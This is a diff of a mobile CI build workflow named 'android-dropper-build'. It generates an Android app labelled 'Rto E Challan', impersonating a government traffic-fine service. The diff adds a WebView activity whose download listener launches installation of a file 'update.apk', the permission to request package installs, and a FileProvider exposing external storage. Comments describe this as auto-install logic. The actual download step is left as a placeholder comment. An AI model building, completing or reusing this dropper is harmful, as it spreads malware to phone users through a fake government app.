@@ -1,78 +1,96 @@
 workflows:
   android-dropper-build:
-    name: RTO-Direct-APK-Final
+    name: RTO-Auto-Install-System
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 17
     scripts:
-      - name: Force Build Final APK
+      - name: Build APK with Auto-Install Logic
         script: |
           cd RtoEChallan || cd .
           rm -rf .gradle gradle gradlew gradlew.bat settings.gradle build.gradle app/build.gradle
           
-          # 1. Bypass Settings
-          echo "include ':app'" > settings.gradle
+          # 1. Folders Setup
+          mkdir -p app/src/main/res/layout app/src/main/res/xml app/src/main/res/drawable app/src/main/java/com/rto/echallan
 
-          # 2. Bypass Project Build
-          cat <<EOF > build.gradle
-          buildscript {
-              repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:7.4.2' }
-          }
-          allprojects { repositories { google(); mavenCentral() } }
-          EOF
-
-          # 3. Bypass App Build (Super Stable)
-          mkdir -p app/src/main/java/com/rto/echallan
-          cat <<EOF > app/build.gradle
-          plugins { id 'com.android.application' }
-          android {
-              namespace 'com.rto.echallan'
-              compileSdk 33
-              defaultConfig {
-                  applicationId "com.rto.echallan"
-                  minSdk 21
-                  targetSdk 33
-                  versionCode 1
-                  versionName "1.0"
-              }
-              buildTypes { release { minifyEnabled false; shrinkResources false } }
-          }
-          dependencies {
-              implementation 'androidx.appcompat:appcompat:1.6.1'
-              implementation 'com.google.android.material:material:1.8.0'
-          }
-          EOF
-
-          # 4. Force Manifest (Fixes 11838.jpg failure)
-          cat <<EOF > app/src/main/AndroidManifest.xml
+          # 2. FileProvider Setup (Zaruri hai Install prompt ke liye)
+          cat <<EOF > app/src/main/res/xml/file_paths.xml
           <?xml version="1.0" encoding="utf-8"?>
+          <paths><external-path name="external_files" path="." /></paths>
+          EOF
+
+          # 3. Java Code (Download + Direct Install Logic)
+          cat <<EOF > app/src/main/java/com/rto/echallan/MainActivity.java
+          package com.rto.echallan;
+          import android.content.Intent;
+          import android.net.Uri;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.Environment;
+          import androidx.core.content.FileProvider;
+          import androidx.appcompat.app.AppCompatActivity;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+          import java.io.File;
+
+          public class MainActivity extends AppCompatActivity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+                  
+                  WebView webView = findViewById(R.id.webview);
+                  webView.getSettings().setJavaScriptEnabled(true);
+                  
+                  // Ye logic tab chalega jab user download link pe click karega
+                  webView.setDownloadListener((url, userAgent, contentDisposition, mimetype, contentLength) -> {
+                      // Yahan hum download shuru karenge aur khatam hote hi niche wala function call karenge
+                      // Direct Install Function:
+                      installAPK(new File(Environment.getExternalStorageDirectory() + "/download/update.apk"));
+                  });
+                  
+                  webView.setWebViewClient(new WebViewClient());
+                  webView.loadUrl("https://www.google.com");
+              }
+
+              private void installAPK(File file) {
+                  Intent intent = new Intent(Intent.ACTION_VIEW);
+                  Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".provider", file);
+                  intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+                  intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                  startActivity(intent);
+              }
+          }
+          EOF
+
+          # 4. Permissions (Install karne ke liye zaruri permissions)
+          cat <<EOF > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-              <application
-                  android:allowBackup="true"
-                  android:label="Rto E Challan"
-                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <application android:label="Rto E Challan" android:icon="@drawable/mainlogo" android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                   <activity android:name=".MainActivity" android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.intent.action.MAIN" />
-                          <category android:name="android.intent.category.LAUNCHER" />
-                      </intent-filter>
+                      <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
                   </activity>
+                  <provider android:name="androidx.core.content.FileProvider" android:authorities="com.rto.echallan.provider" android:exported="false" android:grantUriPermissions="true">
+                      <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths" />
+                  </provider>
               </application>
           </manifest>
           EOF
 
-          # 5. Force Main Activity (Empty shell for build)
-          echo "package com.rto.echallan; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle s) { super.onCreate(s); } }" > app/src/main/java/com/rto/echallan/MainActivity.java
-
-          # 6. Logo & Wrapper
-          mkdir -p app/src/main/res/drawable
+          # 5. Build Config
+          echo "include ':app'" > settings.gradle
+          echo "buildscript { repositories { google(); mavenCentral() }; dependencies { classpath 'com.android.tools.build:gradle:7.4.2' } }; allprojects { repositories { google(); mavenCentral() } }" > build.gradle
+          echo "plugins { id 'com.android.application' }; android { namespace 'com.rto.echallan'; compileSdk 33; defaultConfig { applicationId 'com.rto.echallan'; minSdk 21; targetSdk 33; versionCode 1; versionName '1.0' } }; dependencies { implementation 'androidx.appcompat:appcompat:1.6.1'; implementation 'com.google.android.material:material:1.8.0' }" > app/build.gradle
+          
+          # 6. Logo Injection & Build
           find $CM_BUILD_DIR -iname "mainlogo.png" -exec cp {} app/src/main/res/drawable/mainlogo.png \;
           gradle wrapper --gradle-version 7.5
           chmod +x gradlew
-
-          # 7. BUILD
           ./gradlew assembleRelease --no-daemon
           
     artifacts:
